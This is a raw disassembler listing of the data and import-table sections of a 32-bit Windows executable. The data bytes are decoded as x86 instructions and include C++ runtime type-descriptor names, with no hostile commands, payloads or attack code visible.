  4061b7:	add    ah,dl
  4061b9:	(bad)  
  4061ba:	(bad)  
  4061bb:	inc    DWORD PTR [eax]
  4061bd:	add    BYTE PTR [eax],al
  4061bf:	add    dh,bh
  4061c1:	(bad)  
  4061c2:	(bad)  
  4061c3:	(bad)  
  4061c4:	fcom   QWORD PTR [ebp+0x40]
  4061c7:	add    al,ah
  4061c9:	push   ebp
  4061ca:	inc    eax
  4061cb:	add    BYTE PTR [eax],al
  4061cd:	add    BYTE PTR [eax],al
  4061cf:	add    dh,bh
  4061d1:	(bad)  
  4061d2:	(bad)  
  4061d3:	inc    DWORD PTR [eax]
  4061d5:	add    BYTE PTR [eax],al
  4061d7:	add    al,bl
  4061d9:	(bad)  
  4061da:	(bad)  
  4061db:	inc    DWORD PTR [eax]
  4061dd:	add    BYTE PTR [eax],al
  4061df:	add    dh,bh
  4061e1:	(bad)  
  4061e2:	(bad)  
  4061e3:	(bad)  
  4061e4:	cmp    edx,DWORD PTR [edi+0x40]
  4061e7:	add    BYTE PTR [esi+0x57],cl
  4061ea:	inc    eax
  4061eb:	add    BYTE PTR [ecx],al
  4061ed:	add    BYTE PTR [eax],al
  4061ef:	add    BYTE PTR [edx+eiz*2],al
  4061f2:	inc    eax
	...
  4061ff:	add    ah,ch
  406201:	popa   
  406202:	inc    eax
  406203:	add    BYTE PTR [eax],al
  406205:	add    BYTE PTR [eax],al
  406207:	add    BYTE PTR [eax+0x71],dh
  40620a:	inc    eax
  40620b:	add    BYTE PTR [eax],al
  40620d:	add    BYTE PTR [eax],al
  40620f:	add    bh,bh
  406211:	(bad)  
  406212:	(bad)  
  406213:	inc    DWORD PTR [eax]
  406215:	add    BYTE PTR [eax],al
  406217:	add    BYTE PTR [eax+eax*1],al
  40621a:	add    BYTE PTR [eax],al
  40621c:	add    BYTE PTR [eax],al
	...

Disassembly of section .data:

00407000 <.data>:
  407000:	rcl    BYTE PTR [eax],1
  407002:	inc    eax
  407003:	add    BYTE PTR [eax+0x52],al
  407006:	inc    eax
  407007:	add    BYTE PTR [ecx],al
  407009:	add    BYTE PTR [eax],al
  40700b:	add    BYTE PTR [esi-0x1a],cl
  40700e:	inc    eax
  40700f:	mov    ebx,0x44bf19b1
  407014:	adc    al,0x70
  407016:	inc    eax
  407017:	add    bh,bh
  407019:	(bad)  
  40701a:	(bad)  
  40701b:	inc    DWORD PTR [eax]
  40701d:	add    BYTE PTR [eax],al
  40701f:	add    BYTE PTR [eax+eax*1],ch
	...
  40704e:	add    BYTE PTR [eax],al
  407050:	hlt    
  407051:	adc    BYTE PTR [eax+0x0],al
  407054:	add    BYTE PTR [eax],al
  407056:	add    BYTE PTR [eax],al
  407058:	cs aas 
  40705a:	inc    ecx
  40705b:	push   esi
  40705c:	gs js  0x4070c2
  40705f:	gs jo  0x4070d6
  407062:	imul   ebp,DWORD PTR [edi+0x6e],0xf4004040
  407069:	adc    BYTE PTR [eax+0x0],al
  40706c:	add    BYTE PTR [eax],al
  40706e:	add    BYTE PTR [eax],al
  407070:	cs aas 
  407072:	inc    ecx
  407073:	push   esi
  407074:	bound  esp,QWORD PTR [ecx+0x64]
  407077:	pop    edi
  407078:	popa   
  407079:	ins    BYTE PTR es:[edi],dx
  40707a:	ins    BYTE PTR es:[edi],dx
  40707b:	outs   dx,DWORD PTR ds:[esi]
  40707c:	arpl   WORD PTR [eax+0x73],ax
  40707f:	je     0x4070e5
  407081:	inc    eax
  407082:	inc    eax
  407083:	add    ah,dh
  407085:	adc    BYTE PTR [eax+0x0],al
  407088:	add    BYTE PTR [eax],al
  40708a:	add    BYTE PTR [eax],al
  40708c:	cs aas 
  40708e:	inc    ecx
  40708f:	push   esi
  407090:	inc    ebx
  407091:	inc    ecx
  407092:	je     0x407100
  407094:	dec    ebp
  407095:	outs   dx,DWORD PTR ds:[esi]
  407096:	fs jne 0x407105
  407099:	gs inc eax
  40709b:	inc    ecx
  40709c:	push   esp
  40709d:	dec    esp
  40709e:	inc    eax
  40709f:	inc    eax
  4070a0:	add    BYTE PTR [eax],al
  4070a2:	add    BYTE PTR [eax],al
  4070a4:	hlt    
  4070a5:	adc    BYTE PTR [eax+0x0],al
  4070a8:	add    BYTE PTR [eax],al
  4070aa:	add    BYTE PTR [eax],al
  4070ac:	cs aas 
  4070ae:	inc    ecx
  4070af:	push   ebp
  4070b0:	pop    edi
  4070b1:	inc    ecx
  4070b2:	push   esp
  4070b3:	dec    esp
  4070b4:	pop    edi
  4070b5:	dec    ebp
  4070b6:	dec    edi
  4070b7:	inc    esp
  4070b8:	push   ebp
  4070b9:	dec    esp
  4070ba:	inc    ebp
  4070bb:	aaa    
  4070bc:	xor    BYTE PTR [eax+0x41],al
  4070bf:	push   esp
  4070c0:	dec    esp
  4070c1:	inc    eax
  4070c2:	inc    eax
  4070c3:	add    ah,dh
  4070c5:	adc    BYTE PTR [eax+0x0],al
  4070c8:	add    BYTE PTR [eax],al
  4070ca:	add    BYTE PTR [eax],al
  4070cc:	cs aas 
  4070ce:	inc    ecx
  4070cf:	push   esi
  4070d0:	inc    ebx
  4070d1:	push   edx
  4070d2:	gs addr16 dec edi
  4070d5:	bound  ebp,QWORD PTR [edx+0x65]
  4070d8:	arpl   WORD PTR [eax+eax*2+0x41],si
  4070dc:	push   esp
  4070dd:	dec    esp
  4070de:	inc    eax
  4070df:	inc    eax
  4070e0:	add    BYTE PTR [eax],al
  4070e2:	add    BYTE PTR [eax],al
  4070e4:	hlt    
  4070e5:	adc    BYTE PTR [eax+0x0],al
  4070e8:	add    BYTE PTR [eax],al
  4070ea:	add    BYTE PTR [eax],al
  4070ec:	cs aas 
  4070ee:	inc    ecx
  4070ef:	push   esi
  4070f0:	aas    
  4070f1:	and    al,0x43
  4070f3:	inc    ecx
  4070f4:	je     0x407162
  4070f6:	dec    ebp
  4070f7:	outs   dx,DWORD PTR ds:[esi]
  4070f8:	fs jne 0x407167
  4070fb:	gs push esp
  4070fd:	inc    eax
  4070fe:	push   esi
  4070ff:	inc    ebx
  407100:	inc    ebx
  407101:	outs   dx,DWORD PTR ds:[esi]
  407102:	ins    DWORD PTR es:[edi],dx
  407103:	dec    ebp
  407104:	outs   dx,DWORD PTR ds:[esi]
  407105:	fs jne 0x407174
  407108:	gs inc eax
  40710a:	inc    ecx
  40710b:	push   esp
  40710c:	dec    esp
  40710d:	inc    eax
  40710e:	inc    eax
  40710f:	inc    eax
  407110:	inc    ecx
  407111:	push   esp
  407112:	dec    esp
  407113:	inc    eax
  407114:	inc    eax
  407115:	add    BYTE PTR [eax],al
  407117:	add    ah,dh
  407119:	adc    BYTE PTR [eax+0x0],al
  40711c:	add    BYTE PTR [eax],al
  40711e:	add    BYTE PTR [eax],al
  407120:	cs aas 
  407122:	inc    ecx
  407123:	push   ebp
  407124:	dec    ecx
  407125:	push   ebp
  407126:	outs   dx,BYTE PTR ds:[esi]
  407127:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  40712b:	outs   dx,BYTE PTR ds:[esi]
  40712c:	inc    eax
  40712d:	inc    eax
  40712e:	add    BYTE PTR [eax],al
  407130:	hlt    
  407131:	adc    BYTE PTR [eax+0x0],al
  407134:	add    BYTE PTR [eax],al
  407136:	add    BYTE PTR [eax],al
  407138:	cs aas 
  40713a:	inc    ecx
  40713b:	push   ebp
  40713c:	dec    ecx
  40713d:	push   edx
  40713e:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x42726172
  407147:	popa   
  407148:	jae    0x4071af
  40714a:	inc    eax
  40714b:	inc    eax
  40714c:	add    BYTE PTR [eax],al
  40714e:	add    BYTE PTR [eax],al
  407150:	hlt    
  407151:	adc    BYTE PTR [eax+0x0],al
  407154:	add    BYTE PTR [eax],al
  407156:	add    BYTE PTR [eax],al
  407158:	cs aas 
  40715a:	inc    ecx
  40715b:	push   esi
  40715c:	inc    ebx
  40715d:	inc    ebx
  40715e:	outs   dx,DWORD PTR ds:[esi]
  40715f:	ins    DWORD PTR es:[edi],dx
  407160:	dec    ebp
  407161:	outs   dx,DWORD PTR ds:[esi]
  407162:	fs jne 0x4071d1
  407165:	gs inc eax
  407167:	inc    ecx
  407168:	push   esp
  407169:	dec    esp
  40716a:	inc    eax
  40716b:	inc    eax
  40716c:	add    BYTE PTR [eax],al
  40716e:	add    BYTE PTR [eax],al
  407170:	hlt    
  407171:	adc    BYTE PTR [eax+0x0],al
  407174:	add    BYTE PTR [eax],al
  407176:	add    BYTE PTR [eax],al
  407178:	cs aas 
  40717a:	inc    ecx
  40717b:	push   esi
  40717c:	inc    ebx
  40717d:	inc    ecx
  40717e:	je     0x4071ec
  407180:	inc    ebp
  407181:	js     0x4071e6
  407183:	gs jo  0x4071fa
  407186:	imul   ebp,DWORD PTR [edi+0x6e],0x4c544140
  40718d:	inc    eax
  40718e:	inc    eax
	...

Disassembly of section .idata:

00408000 <.idata>:
  408000:	adc    eax,0x800001
  408005:	add    BYTE PTR [eax],al
  408007:	add    ah,bl
  408009:	lea    eax,[eax]
  40800b:	add    dh,dh
  40800d:	lea    eax,[eax]
  40800f:	add    dl,cl
  408011:	lea    eax,[eax]
  408013:	add    BYTE PTR [eax+0x1400008d],bh
  408019:	mov    es,WORD PTR [eax]
  40801b:	add    BYTE PTR [esi+ecx*4],al
  40801e:	add    BYTE PTR [eax],al
  408020:	jmp    0x0:0x8d
  408027:	add    BYTE PTR [eax-0x77],bh
  40802a:	add    BYTE PTR [eax],al
  40802c:	pop    eax
  40802d:	mov    DWORD PTR [eax],eax
  40802f:	add    BYTE PTR [esi-0x79],dl
  408032:	add    BYTE PTR [eax],al
  408034:	mov    esp,0x87
  408039:	add    BYTE PTR [eax],al
  40803b:	add    BYTE PTR [esi],dl
  40803d:	mov    eax,DWORD PTR [eax]
  40803f:	add    BYTE PTR [eax],al
  408041:	add    BYTE PTR [eax],al
  408043:	add    BYTE PTR [edx+ecx*4+0x0],cl
  408047:	add    dl,dl
  408049:	mov    BYTE PTR [eax],al
  40804b:	add    ah,dh
  40804d:	mov    BYTE PTR [eax],al
  40804f:	add    ah,ah
  408051:	mov    BYTE PTR [eax],al
  408053:	add    BYTE PTR [eax],dh
  408055:	mov    al,BYTE PTR [eax]
  408057:	add    BYTE PTR [eax],al
  408059:	add    BYTE PTR [eax],al
  40805b:	add    BYTE PTR [edx],cl
  40805d:	mov    al,BYTE PTR [eax]
  40805f:	add    BYTE PTR [eax],al
  408061:	add    BYTE PTR [eax],al
  408063:	add    BYTE PTR [edi+eax*4-0x78660000],cl
  40806a:	add    BYTE PTR [eax],al
  40806c:	stos   BYTE PTR es:[edi],al
  40806d:	xchg   DWORD PTR [eax],eax
  40806f:	add    BYTE PTR [edx-0x79],bh
  408072:	add    BYTE PTR [eax],al
  408074:	rol    BYTE PTR [edi-0x76fc0000],1
  40807a:	add    BYTE PTR [eax],al
  40807c:	push   edx
  40807d:	mov    BYTE PTR [eax],al
  40807f:	add    BYTE PTR [edx-0x59ffff76],dl
  408085:	mov    BYTE PTR [eax],al
  408087:	add    BYTE PTR [eax],al
  408089:	add    BYTE PTR [eax],al
  40808b:	add    BYTE PTR [eax+ecx*4+0x0],ah
  40808f:	add    BYTE PTR [eax],al
  408091:	add    BYTE PTR [eax],al
  408093:	add    BYTE PTR [esi],bl
  408095:	mov    al,BYTE PTR [eax]
  408097:	add    BYTE PTR [edx-0x76],ch
  40809a:	add    BYTE PTR [eax],al
  40809c:	jle    0x408028
  40809e:	add    BYTE PTR [eax],al
  4080a0:	(bad)  
  4080a1:	mov    al,BYTE PTR [eax]
  4080a3:	add    al,al
  4080a5:	mov    al,BYTE PTR [eax]
  4080a7:	add    BYTE PTR [eax],al
  4080a9:	add    BYTE PTR [eax],al
  4080ab:	add    BYTE PTR [esi+0x8a],ah
  4080b1:	add    BYTE PTR [eax],al
  4080b3:	add    BYTE PTR [eax-0x77],ch
  4080b6:	add    BYTE PTR [eax],al
  4080b8:	push   ss
  4080b9:	mov    DWORD PTR [eax],eax
  4080bb:	add    al,bh
  4080bd:	mov    DWORD PTR [eax],eax
  4080bf:	add    BYTE PTR [esi],bh
  4080c1:	mov    BYTE PTR [eax],al
  4080c3:	add    ah,ah
  4080c5:	xchg   DWORD PTR [eax],eax
  4080c7:	add    BYTE PTR [ecx+ecx*4-0x762c0000],ch
  4080ce:	add    BYTE PTR [eax],al
  4080d0:	add    BYTE PTR [eax],al
  4080d2:	add    BYTE PTR [eax],al
  4080d4:	push   esp
  4080d5:	mov    es,WORD PTR [eax]
  4080d7:	add    BYTE PTR [edx-0x72],al
  4080da:	add    BYTE PTR [eax],al
  4080dc:	xor    cl,BYTE PTR [esi-0x71980000]
  4080e2:	add    BYTE PTR [eax],al
  4080e4:	add    BYTE PTR [eax],al
  4080e6:	add    BYTE PTR [eax],al
  4080e8:	mov    esp,0x28000088
  4080ed:	mov    BYTE PTR [eax],al
  4080ef:	add    BYTE PTR [eax],al
  4080f1:	add    BYTE PTR [eax],al
  4080f3:	add    BYTE PTR [edx+0x89],cl
  4080f9:	add    BYTE PTR [eax],al
  4080fb:	add    BYTE PTR [ebp+ecx*4+0x0],al
  4080ff:	add    BYTE PTR [eax],al
  408101:	add    BYTE PTR [eax],al
  408103:	add    BYTE PTR [esi],dl
  408105:	mov    al,BYTE PTR [eax]
  408107:	add    BYTE PTR [esi-0x78],dh
  40810a:	add    BYTE PTR [eax],al
  40810c:	sub    BYTE PTR [ecx-0x77f40000],cl
  408112:	add    BYTE PTR [eax],al
  408114:	mov    esp,0x89
  408119:	add    BYTE PTR [eax],al
  40811b:	add    BYTE PTR [esi],al
  40811d:	mov    eax,DWORD PTR [eax]
  40811f:	add    ah,ch
  408121:	mov    al,BYTE PTR [eax]
  408123:	add    BYTE PTR [eax],al
  408125:	add    BYTE PTR [eax],al
  408127:	add    BYTE PTR [esi+0x40000088],cl
  40812d:	mov    DWORD PTR [eax],eax
  40812f:	add    BYTE PTR [esi-0x9ffff77],dl
  408135:	xchg   DWORD PTR [eax],eax
  408137:	add    BYTE PTR [edx-0x79],ch
  40813a:	add    BYTE PTR [eax],al
  40813c:	loop   0x4080c7
  40813e:	add    BYTE PTR [eax],al
  408140:	add    BYTE PTR [eax],al
  408142:	add    BYTE PTR [eax],al
  408144:	push   eax
  408145:	lea    eax,[eax]
  408147:	add    BYTE PTR [eax],al
  408149:	add    BYTE PTR [eax],al
  40814b:	add    BYTE PTR [esi-0x71ffff7a],ch
  408151:	xchg   BYTE PTR [eax],al
  408153:	add    BYTE PTR [eax-0x7b],bl
  408156:	add    BYTE PTR [eax],al
  408158:	xchg   DWORD PTR cs:[eax],eax
  40815b:	add    al,bh
  40815d:	xchg   BYTE PTR [eax],al
  40815f:	add    BYTE PTR [eax+0x3c000086],al
  408165:	xchg   DWORD PTR [eax],eax
  408167:	add    BYTE PTR [edx+0x76000086],ah
  40816d:	xchg   BYTE PTR [eax],al
  40816f:	add    dl,ch
  408171:	xchg   BYTE PTR [eax],al
  408173:	add    BYTE PTR [esi-0x7a],ah
  408176:	add    BYTE PTR [eax],al
  408178:	push   esp
  408179:	xchg   BYTE PTR [eax],al
  40817b:	add    ah,al
  40817d:	xchg   BYTE PTR [eax],al
  40817f:	add    BYTE PTR [esi+eax*4],dh
  408182:	add    BYTE PTR [eax],al
  408184:	and    al,0x86
  408186:	add    BYTE PTR [eax],al
  408188:	push   ss
  408189:	xchg   BYTE PTR [eax],al
  40818b:	add    BYTE PTR [eax],al
  40818d:	xchg   BYTE PTR [eax],al
  40818f:	add    ah,dh
  408191:	test   DWORD PTR [eax],eax
  408193:	add    al,bl
  408195:	test   DWORD PTR [eax],eax
  408197:	add    al,al
  408199:	test   DWORD PTR [eax],eax
  40819b:	add    BYTE PTR [ebp+eax*4-0x7a740000],ah
  4081a2:	add    BYTE PTR [eax],al
  4081a4:	add    al,BYTE PTR [edi-0x7a7e0000]
  4081aa:	add    BYTE PTR [eax],al
  4081ac:	jbe    0x408133
  4081ae:	add    BYTE PTR [eax],al
  4081b0:	ins    BYTE PTR es:[edi],dx
  4081b1:	test   DWORD PTR [eax],eax
  4081b3:	add    BYTE PTR [ebp+eax*4+0x0],ah
  4081b7:	add    al,bl
  4081b9:	xchg   BYTE PTR [eax],al
  4081bb:	add    BYTE PTR [edx-0x7a],al
  4081be:	add    BYTE PTR [eax],al
  4081c0:	or     al,0x87
  4081c2:	add    BYTE PTR [eax],al
  4081c4:	push   ss
  4081c5:	xchg   DWORD PTR [eax],eax
  4081c7:	add    al,ah
  4081c9:	xchg   BYTE PTR [eax],al
  4081cb:	add    BYTE PTR [esi-0x7a],ch
  4081ce:	add    BYTE PTR [eax],al
  4081d0:	sahf   
  4081d1:	mov    es,WORD PTR [eax]
  4081d3:	add    BYTE PTR [eax],al
  4081d5:	add    BYTE PTR [eax],al
  4081d7:	add    BYTE PTR [eax],dl
  4081d9:	pop    ecx
  4081da:	inc    eax
  4081db:	add    ah,cl
  4081dd:	test   BYTE PTR [eax],al
	...
  4081e7:	add    BYTE PTR [eax+0x4c000086],bh
  4081ed:	add    DWORD PTR [eax],0x83a800
	...
  4081fb:	add    BYTE PTR [ebx+ecx*4],ch
  4081fe:	add    BYTE PTR [eax],al
  408200:	sub    BYTE PTR [eax-0x7b580000],al
	...
  40820e:	add    BYTE PTR [eax],al
  408210:	dec    esp
  408211:	mov    eax,DWORD PTR [eax]
  408213:	add    BYTE PTR [eax],ch
  408215:	add    DWORD PTR [eax],0x83e400
	...
  408223:	add    BYTE PTR [ebx+ecx*4+0x0],bh
  408227:	add    BYTE PTR [eax+eax*4+0x0],ah
  40822b:	add    BYTE PTR [esp+eax*4],dh
	...
  408236:	add    BYTE PTR [eax],al
  408238:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408239:	mov    eax,DWORD PTR [eax]
  40823b:	add    BYTE PTR [eax+eax*4-0x7b7c0000],dh
	...
  40824a:	add    BYTE PTR [eax],al
  40824c:	retf   0x8b
  40824f:	add    BYTE PTR [ecx+eax*4],al
  408252:	add    BYTE PTR [eax],al
  408254:	push   0x84
  408259:	add    BYTE PTR [eax],al
  40825b:	add    BYTE PTR [eax],al
  40825d:	add    BYTE PTR [eax],al
  40825f:	add    ah,ch
  408261:	mov    eax,DWORD PTR [eax]
  408263:	add    al,ch
  408265:	add    BYTE PTR [eax],0x0
  408268:	or     al,0x84
	...
  408272:	add    BYTE PTR [eax],al
  408274:	push   cs
  408275:	mov    WORD PTR [eax],es
  408277:	add    BYTE PTR [eax+eax*4-0x7c3c0000],cl
	...
  408286:	add    BYTE PTR [eax],al
  408288:	mov    WORD PTR ss:[eax],es
  40828b:	add    BYTE PTR [eax+eax*4+0x0],al
  40828f:	add    BYTE PTR [eax+0x83],al
  408295:	add    BYTE PTR [eax],al
  408297:	add    BYTE PTR [eax],al
  408299:	add    BYTE PTR [eax],al
  40829b:	add    BYTE PTR [eax-0x74],ah
  40829e:	add    BYTE PTR [eax],al
  4082a0:	add    BYTE PTR [eax-0x7b8c0000],al
	...
  4082ae:	add    BYTE PTR [eax],al
  4082b0:	outs   dx,BYTE PTR ds:[esi]
  4082b1:	mov    WORD PTR [eax],es
  4082b3:	add    ah,dh
  4082b5:	add    BYTE PTR [eax],0x0
  4082b8:	fadd   QWORD PTR [ebx+0x0]
  4082be:	add    BYTE PTR [eax],al
  4082c0:	add    BYTE PTR [eax],al
  4082c2:	add    BYTE PTR [eax],al
  4082c4:	nop
  4082c5:	mov    WORD PTR [eax],es
  4082c7:	add    BYTE PTR [eax+eax*4+0x0],bl
  4082cb:	add    BYTE PTR [esp+eax*4+0x0],bl
  4082d2:	add    BYTE PTR [eax],al
  4082d4:	add    BYTE PTR [eax],al
  4082d6:	add    BYTE PTR [eax],al
  4082d8:	mov    al,0x8c
  4082da:	add    BYTE PTR [eax],al
  4082dc:	sbb    al,0x81
  4082de:	add    BYTE PTR [eax],al
  4082e0:	adc    al,0x84
	...
  4082ea:	add    BYTE PTR [eax],al
  4082ec:	aam    0x8c
  4082ee:	add    BYTE PTR [eax],al
  4082f0:	xchg   esp,eax
  4082f1:	add    BYTE PTR [eax],0x0
  4082f4:	sub    al,0x84
	...
  4082fe:	add    BYTE PTR [eax],al
  408300:	dec    BYTE PTR [eax+eax*1+0x80ac00]
  408307:	add    BYTE PTR [ebx+eax*4+0x0],bh
  40830e:	add    BYTE PTR [eax],al
  408310:	add    BYTE PTR [eax],al
  408312:	add    BYTE PTR [eax],al
  408314:	and    cl,BYTE PTR [ebp-0x7fc40000]
  40831a:	add    BYTE PTR [eax],al
  40831c:	jl     0x4082a2
	...
  408326:	add    BYTE PTR [eax],al
  408328:	lea    ax,[eax]
  40832b:	add    ah,bh
  40832d:	add    BYTE PTR [eax],0x0
  408330:	les    eax,FWORD PTR [eax+eax*1+0x0]
  408337:	add    BYTE PTR [eax],al
  408339:	add    BYTE PTR [eax],al
  40833b:	add    BYTE PTR [edx+0x4400008d],dl
  408341:	add    DWORD PTR [eax],0x838800
	...
  40834f:	add    BYTE PTR [esi],ah
  408351:	mov    es,WORD PTR [eax]
  408353:	add    BYTE PTR [eax],cl
  408355:	add    BYTE PTR [eax],0x0
  408358:	push   esp
  408359:	test   BYTE PTR [eax],al
	...
  408363:	add    BYTE PTR [eax-0x72],bh
  408366:	add    BYTE PTR [eax],al
  408368:	aam    0x80
	...
  40837e:	add    BYTE PTR [eax],al
  408380:	adc    eax,0x800001
  408385:	add    BYTE PTR [eax],al
  408387:	add    ah,bl
  408389:	lea    eax,[eax]
  40838b:	add    dh,dh
  40838d:	lea    eax,[eax]
  40838f:	add    dl,cl
  408391:	lea    eax,[eax]
  408393:	add    BYTE PTR [eax+0x1400008d],bh
  408399:	mov    es,WORD PTR [eax]
  40839b:	add    BYTE PTR [esi+ecx*4],al
  40839e:	add    BYTE PTR [eax],al
  4083a0:	jmp    0x0:0x8d
  4083a7:	add    BYTE PTR [eax-0x77],bh
  4083aa:	add    BYTE PTR [eax],al
  4083ac:	pop    eax
  4083ad:	mov    DWORD PTR [eax],eax
  4083af:	add    BYTE PTR [esi-0x79],dl
  4083b2:	add    BYTE PTR [eax],al
  4083b4:	mov    esp,0x87
  4083b9:	add    BYTE PTR [eax],al
  4083bb:	add    BYTE PTR [esi],dl
  4083bd:	mov    eax,DWORD PTR [eax]
  4083bf:	add    BYTE PTR [eax],al
  4083c1:	add    BYTE PTR [eax],al
  4083c3:	add    BYTE PTR [edx+ecx*4+0x0],cl
  4083c7:	add    dl,dl
  4083c9:	mov    BYTE PTR [eax],al
  4083cb:	add    ah,dh
  4083cd:	mov    BYTE PTR [eax],al
  4083cf:	add    ah,ah
  4083d1:	mov    BYTE PTR [eax],al
  4083d3:	add    BYTE PTR [eax],dh
  4083d5:	mov    al,BYTE PTR [eax]
  4083d7:	add    BYTE PTR [eax],al
  4083d9:	add    BYTE PTR [eax],al
  4083db:	add    BYTE PTR [edx],cl
  4083dd:	mov    al,BYTE PTR [eax]
  4083df:	add    BYTE PTR [eax],al
  4083e1:	add    BYTE PTR [eax],al
  4083e3:	add    BYTE PTR [edi+eax*4-0x78660000],cl
  4083ea:	add    BYTE PTR [eax],al
  4083ec:	stos   BYTE PTR es:[edi],al
  4083ed:	xchg   DWORD PTR [eax],eax
  4083ef:	add    BYTE PTR [edx-0x79],bh
  4083f2:	add    BYTE PTR [eax],al
  4083f4:	rol    BYTE PTR [edi-0x76fc0000],1
  4083fa:	add    BYTE PTR [eax],al
  4083fc:	push   edx
  4083fd:	mov    BYTE PTR [eax],al
  4083ff:	add    BYTE PTR [edx-0x59ffff76],dl
  408405:	mov    BYTE PTR [eax],al
  408407:	add    BYTE PTR [eax],al
  408409:	add    BYTE PTR [eax],al
  40840b:	add    BYTE PTR [eax+ecx*4+0x0],ah
  40840f:	add    BYTE PTR [eax],al
  408411:	add    BYTE PTR [eax],al
  408413:	add    BYTE PTR [esi],bl
  408415:	mov    al,BYTE PTR [eax]
  408417:	add    BYTE PTR [edx-0x76],ch
  40841a:	add    BYTE PTR [eax],al
  40841c:	jle    0x4083a8
  40841e:	add    BYTE PTR [eax],al
  408420:	(bad)  
  408421:	mov    al,BYTE PTR [eax]
  408423:	add    al,al
  408425:	mov    al,BYTE PTR [eax]
  408427:	add    BYTE PTR [eax],al
  408429:	add    BYTE PTR [eax],al
  40842b:	add    BYTE PTR [esi+0x8a],ah
  408431:	add    BYTE PTR [eax],al
  408433:	add    BYTE PTR [eax-0x77],ch
  408436:	add    BYTE PTR [eax],al
  408438:	push   ss
  408439:	mov    DWORD PTR [eax],eax
  40843b:	add    al,bh
  40843d:	mov    DWORD PTR [eax],eax
  40843f:	add    BYTE PTR [esi],bh
  408441:	mov    BYTE PTR [eax],al
  408443:	add    ah,ah
  408445:	xchg   DWORD PTR [eax],eax
  408447:	add    BYTE PTR [ecx+ecx*4-0x762c0000],ch
  40844e:	add    BYTE PTR [eax],al
  408450:	add    BYTE PTR [eax],al
  408452:	add    BYTE PTR [eax],al
  408454:	push   esp
  408455:	mov    es,WORD PTR [eax]
  408457:	add    BYTE PTR [edx-0x72],al
  40845a:	add    BYTE PTR [eax],al
  40845c:	xor    cl,BYTE PTR [esi-0x71980000]
  408462:	add    BYTE PTR [eax],al
  408464:	add    BYTE PTR [eax],al
  408466:	add    BYTE PTR [eax],al
  408468:	mov    esp,0x28000088
  40846d:	mov    BYTE PTR [eax],al
  40846f:	add    BYTE PTR [eax],al
  408471:	add    BYTE PTR [eax],al
  408473:	add    BYTE PTR [edx+0x89],cl
  408479:	add    BYTE PTR [eax],al
  40847b:	add    BYTE PTR [ebp+ecx*4+0x0],al
  40847f:	add    BYTE PTR [eax],al
  408481:	add    BYTE PTR [eax],al
  408483:	add    BYTE PTR [esi],dl
  408485:	mov    al,BYTE PTR [eax]
  408487:	add    BYTE PTR [esi-0x78],dh
  40848a:	add    BYTE PTR [eax],al
  40848c:	sub    BYTE PTR [ecx-0x77f40000],cl
  408492:	add    BYTE PTR [eax],al
  408494:	mov    esp,0x89
  408499:	add    BYTE PTR [eax],al
  40849b:	add    BYTE PTR [esi],al
  40849d:	mov    eax,DWORD PTR [eax]
  40849f:	add    ah,ch
  4084a1:	mov    al,BYTE PTR [eax]
  4084a3:	add    BYTE PTR [eax],al
  4084a5:	add    BYTE PTR [eax],al
  4084a7:	add    BYTE PTR [esi+0x40000088],cl
  4084ad:	mov    DWORD PTR [eax],eax
  4084af:	add    BYTE PTR [esi-0x9ffff77],dl
  4084b5:	xchg   DWORD PTR [eax],eax
  4084b7:	add    BYTE PTR [edx-0x79],ch
  4084ba:	add    BYTE PTR [eax],al
  4084bc:	loop   0x408447
  4084be:	add    BYTE PTR [eax],al
  4084c0:	add    BYTE PTR [eax],al
  4084c2:	add    BYTE PTR [eax],al
  4084c4:	push   eax
  4084c5:	lea    eax,[eax]
  4084c7:	add    BYTE PTR [eax],al
  4084c9:	add    BYTE PTR [eax],al
  4084cb:	add    BYTE PTR [esi-0x71ffff7a],ch
  4084d1:	xchg   BYTE PTR [eax],al
  4084d3:	add    BYTE PTR [eax-0x7b],bl
  4084d6:	add    BYTE PTR [eax],al
  4084d8:	xchg   DWORD PTR cs:[eax],eax
  4084db:	add    al,bh
  4084dd:	xchg   BYTE PTR [eax],al
  4084df:	add    BYTE PTR [eax+0x3c000086],al
  4084e5:	xchg   DWORD PTR [eax],eax
  4084e7:	add    BYTE PTR [edx+0x76000086],ah
  4084ed:	xchg   BYTE PTR [eax],al
  4084ef:	add    dl,ch
  4084f1:	xchg   BYTE PTR [eax],al
  4084f3:	add    BYTE PTR [esi-0x7a],ah
  4084f6:	add    BYTE PTR [eax],al
  4084f8:	push   esp
  4084f9:	xchg   BYTE PTR [eax],al
  4084fb:	add    ah,al
  4084fd:	xchg   BYTE PTR [eax],al
  4084ff:	add    BYTE PTR [esi+eax*4],dh
  408502:	add    BYTE PTR [eax],al
  408504:	and    al,0x86
  408506:	add    BYTE PTR [eax],al
  408508:	push   ss
  408509:	xchg   BYTE PTR [eax],al
  40850b:	add    BYTE PTR [eax],al
  40850d:	xchg   BYTE PTR [eax],al
  40850f:	add    ah,dh
  408511:	test   DWORD PTR [eax],eax
  408513:	add    al,bl
  408515:	test   DWORD PTR [eax],eax
  408517:	add    al,al
  408519:	test   DWORD PTR [eax],eax
  40851b:	add    BYTE PTR [ebp+eax*4-0x7a740000],ah
  408522:	add    BYTE PTR [eax],al
  408524:	add    al,BYTE PTR [edi-0x7a7e0000]
  40852a:	add    BYTE PTR [eax],al
  40852c:	jbe    0x4084b3
  40852e:	add    BYTE PTR [eax],al
  408530:	ins    BYTE PTR es:[edi],dx
  408531:	test   DWORD PTR [eax],eax
  408533:	add    BYTE PTR [ebp+eax*4+0x0],ah
  408537:	add    al,bl
  408539:	xchg   BYTE PTR [eax],al
  40853b:	add    BYTE PTR [edx-0x7a],al
  40853e:	add    BYTE PTR [eax],al
  408540:	or     al,0x87
  408542:	add    BYTE PTR [eax],al
  408544:	push   ss
  408545:	xchg   DWORD PTR [eax],eax
  408547:	add    al,ah
  408549:	xchg   BYTE PTR [eax],al
  40854b:	add    BYTE PTR [esi-0x7a],ch
  40854e:	add    BYTE PTR [eax],al
  408550:	sahf   
  408551:	mov    es,WORD PTR [eax]
  408553:	add    BYTE PTR [eax],al
  408555:	add    BYTE PTR [eax],al
  408557:	add    BYTE PTR [ebp+eax*1+0x77],bh
  40855b:	arpl   WORD PTR [ebx+0x6e],si
  40855e:	arpl   WORD PTR [eax+0x79],si
  408561:	pop    edi
  408562:	jae    0x408564
  408564:	lds    eax,FWORD PTR [esi+eiz*2]
  408567:	jb     0x4085ce
  408569:	add    BYTE PTR gs:[eax],al
  40856c:	std    
  40856d:	add    al,0x6d
  40856f:	popa   
